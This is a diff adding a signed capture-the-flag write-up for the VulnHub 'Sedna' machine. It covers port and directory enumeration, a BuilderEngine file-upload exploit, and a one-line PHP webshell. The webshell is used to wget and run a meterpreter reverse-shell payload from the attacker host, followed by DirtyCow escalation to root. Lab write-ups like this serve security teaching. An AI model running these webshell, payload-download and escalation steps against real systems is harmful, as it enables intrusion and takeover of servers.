@@ -1,0 +1,275 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: 2017_hackfest2016-sedna.txt,v 1.0 2017/03/17 11:00:04 dhn Exp $
+
+Writeup hackfest2016: Sedna [1]
+
+0x0) found the ports
+
+[dhn]::[~/dev/ctf/write_up/boot2root] export ip=174.0.42.15
+[dhn]::[~/dev/ctf/write_up/boot2root] nmap -A -T4 -p- $ip
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-16 06:17 EDT
+Nmap scan report for S0106a84e3fe23233.cg.shawcable.net (174.0.42.15)
+Host is up (0.00019s latency).
+Not shown: 65523 closed ports
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
+|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
+|_  256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
+53/tcp    open  domain      ISC BIND 9.9.5-3-Ubuntu
+| dns-nsid:
+|_  bind.version: 9.9.5-3-Ubuntu
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_Hackers
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3        Dovecot pop3d
+|_pop3-capabilities: CAPA UIDL RESP-CODES SASL STLS PIPELINING AUTH-RESP-CODE TOP
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T19:17:14
+|_Not valid after:  2026-10-07T19:17:14
+|_ssl-date: TLS randomness does not represent time
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          43226/tcp  status
+|_  100024  1          59266/udp  status
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp   open  imap        Dovecot imapd (Ubuntu)
+|_imap-capabilities: more LITERAL+ IMAP4rev1 have post-login LOGINDISABLEDA0001 ENABLE listed ID IDLE capabilities Pre-login SASL-IR OK STARTTLS LOGIN-REFERRALS
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T19:17:14
+|_Not valid after:  2026-10-07T19:17:14
+|_ssl-date: TLS randomness does not represent time
+445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
+993/tcp   open  ssl/imap    Dovecot imapd (Ubuntu)
+|_imap-capabilities: LITERAL+ IMAP4rev1 more have Pre-login ENABLE post-login ID IDLE listed capabilities SASL-IR OK AUTH=PLAINA0001 LOGIN-REFERRALS
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T19:17:14
+|_Not valid after:  2026-10-07T19:17:14
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3    Dovecot pop3d
+|_pop3-capabilities: CAPA UIDL RESP-CODES SASL(PLAIN) USER PIPELINING AUTH-RESP-CODE TOP
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T19:17:14
+|_Not valid after:  2026-10-07T19:17:14
+|_ssl-date: TLS randomness does not represent time
+8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat
+43226/tcp open  status      1 (RPC #100024)
+Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -40s, deviation: 0s, median: -40s
+|_nbstat: NetBIOS name: SEDNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 4.1.6-Ubuntu)
+|   NetBIOS computer name: SEDNA\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2017-03-16T06:17:45-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 257.01 seconds
+
+0x1) use gobuster to found some interested folder/files
+
+[dhn]::[~/dev/ctf/write_up/boot2root] gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
+
+Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://174.0.42.15/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 204,301,302,307,200
+=====================================================
+/blocks (Status: 301)
+/files (Status: 301)
+/index.html (Status: 200)
+/modules (Status: 301)
+/robots.txt (Status: 200)
+/system (Status: 301)
+/themes (Status: 301)
+=====================================================
+
+[dhn]::[~/dev/ctf/write_up/boot2root] gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip:8080
+
+Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://174.0.42.15:8080/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307
+=====================================================
+/docs (Status: 302)
+/examples (Status: 302)
+/host-manager (Status: 302)
+/index.html (Status: 200)
+/manager (Status: 302)
+/META-INF (Status: 302)
+=====================================================
+
+0x2) open firefox and go to http://$ip/themes/
+
+0x3) enumeration, enumeration... find "http://$ip/themes/default_theme_2016/description.txt"
+
+	Default Theme 2016 for BuilderEngine V3.
+
+0x4) search for exploits
+
+[dhn]::[~/dev/ctf/write_up/boot2root] searchsploit builderengine
+- --------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                       |  Path
+                                                                     | (/usr/share/exploitdb/platforms)
+- --------------------------------------------------------------------- ----------------------------------
+BuilderEngine 3.5.0 - Arbitrary File Upload                          | /php/webapps/40390.php
+- --------------------------------------------------------------------- ----------------------------------
+
+0x5) modify and trigger the exploit
+
+[dhn]::[~/dev/ctf/write_up/boot2root] diff -ruN index.php 40390.php
+- --- index.php   2017-03-17 04:12:02.279123922 -0400
++++ 40390.php   2017-03-17 04:16:28.743128925 -0400
+@@ -19,7 +19,7 @@
+ -->
+ <html>
+ <body>
+- -<form method="post" action="http://174.0.42.15/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
++<form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
+        <input type="file" name="files[]" />
+        <input type="submit" value="send" />
+ </form>
+
+0x6) upload webshell "sh.php"
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat sh.php
+<?php system($_POST["cmd"]); ?>
+[dhn]::[~/dev/ctf/write_up/boot2root] php -S 127.0.0.1:8080
+PHP 7.0.16-3 Development Server started at Fri Mar 17 04:13:48 2017
+Listening on http://127.0.0.1:8080
+Document root is /home/dhn/dev/ctf/write_up/boot2root
+Press Ctrl-C to quit.
+[Fri Mar 17 04:13:51 2017] 127.0.0.1:39162 [200]: /
+
+0x7) test the webshell
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=id" http://$ip/files/sh.php
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=uname -a" http://$ip/files/sh.php
+Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
+
+0x8) create meterpreter and start multi handler
+
+[dhn]::[~/dev/ctf/write_up/boot2root] msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux -b '\\x00' LHOST="174.0.42.42" LPORT=7766 -f elf -o dhn
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 98 (iteration=0)
+x86/shikata_ga_nai chosen with final size 98
+Payload size: 98 bytes
+Final size of elf file: 182 bytes
+Saved as: dhn
+
+0x9) use the webshell to download and execute the meterpreter
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O /tmp/evil" http://$ip/files/sh.php
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=chmod 777 /tmp/evil" http://$ip/files/sh.php
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php
+
+0xa) gathering information
+
+msf exploit(handler) > run
+
+[*] Started reverse TCP handler on 174.0.42.42:7766
+[*] Starting the payload handler...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] Sending stage (1495599 bytes) to 174.0.42.15
+[*] Meterpreter session 1 opened (174.0.42.42:7766 -> 174.0.42.15:51232) at 2017-03-17 04:37:20 -0400
+
+meterpreter > sysinfo
+Computer     : Sedna
+OS           : Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 (i686)
+Architecture : i686
+Meterpreter  : x86/linux
+meterpreter > shell
+Process 13823 created.
+Channel 2 created.
+/bin/sh: 0: can't access tty; job control turned off
+$ bash
+bash: cannot set terminal process group (1825): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Sedna:/home$ find / -name "*flag.txt*" 2>/dev/null
+/var/www/flag.txt
+www-data@Sedna:/home$
+
+0xb) get the first flag
+
+www-data@Sedna:/home$ cat /var/www/flag.txt
+bfbb7e6e6e88d9ae66848b9aeac6b289
+www-data@Sedna:/home$
+
+0xc) privilege escalation - dirtycow [2]
+
+www-data@Sedna:/tmp$ ./cow32
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 45420
+Racing, this may take a while..
+thread stopped
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+bash: cannot set terminal process group (1825): Inappropriate ioctl for device
+bash: no job control in this shell
+root@Sedna:/tmp# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+root@Sedna:/tmp# id
+uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
+root@Sedna:/tmp#
+
+0xd) get the second flag
+
+root@Sedna:/tmp# cd /root
+root@Sedna:/root# ls
+8d2daf441809dcd86398d3d750d768b5-BuilderEngine-CMS-V3.zip  chkrootkit  flag.txt
+root@Sedna:/root# cat flag.txt
+a10828bee17db751de4b936614558305
+root@Sedna:/root#
+
+[1] https://www.vulnhub.com/entry/hackfest2016-sedna,181/
+[2] https://www.exploit-db.com/exploits/40616/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJYy7PvAAoJEKjdmUcmQRI82DkQAKQ7dBDpaISMesaVpLPGWiC2
+MUtltb32ofRzkCSZWMCqvtrMR2yNMNDKrPuqKdNKrMZdpSfPlfNE/H3cdFgxOP07
+ZFjo4BB//NLyOWR6o6RoEDs7kfZEnLUoBjMRtEyepKNXGvah3f8sczzINe3EE/Wv
+GLBYKQ6SOFhPxcjFwADer5eyu8WMq2ejXPSHETeXitUIvdUs4/+mWRp9o750fnZJ
+ElaxSDVOfwLhLls+C0Jmj0WwB20/oqpmW/NeEWhDV6ykrBSjxyEbqAcqNj/pQjku
+afSi1eHkfVyoFSxqQv4pAmm4SZX5TppyRYO1hxuiZrm12FTZfCHqMyl08u2Mm1Iz
+Z42VDFfeA1R6gDqYmpfzLN3NtsJapxZ25zvQMjv04wspBDji4kHbUPGS5aeRuvGG
+B19SGxPikIBLufF+c+eDfnJvhnNP2QJfX15RRINqVZz2PzA7kVq352QWFUrpUPOz
+YXH0GHapHLmiVJPIyuuTsp0q3mEdAAm8npUFxROaZtMTZIKKKAd6HEL8AGU9OArb
+LWsZdnc0JICMeBK1KlUfT/asRHM7aMi19RSbSpGGGaP+EU/gsx+bE/fCFcT0B25C
+ZOSm5IWK4pliSsshz6LHOIR9v7Bc5HM5zo0quOA9aNaM6Bva3lX4k6UKWVn64ToZ
+08rqsWT5Tque2Gf+2cjs
+=GOYp
+-----END PGP SIGNATURE-----
